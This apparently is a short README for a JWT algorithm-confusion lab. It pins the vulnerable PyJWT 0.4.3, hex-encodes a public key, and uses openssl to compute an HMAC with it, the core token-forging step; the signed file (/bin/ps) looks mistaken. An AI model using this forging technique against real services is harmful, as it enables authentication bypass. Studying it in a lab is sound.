# JWT_confusion_attack

pip install pyjwt==0.4.3
pip install flask flask-restful
pip install flask_sqlalchemy
pip install cryptography

cat pubkey.pem | xxd -p | tr -d "\\n" > myhmac.txt

openssl dgst -sha256 -hmac -hex -macopt hexkey:\$(cat myhmac.txt) -out hmac.txt /bin/ps

https://www.getpostman.com/collections/4c9cf3a2d70263317bd6
https://pypi.org/project/PyJWT/0.4.3/
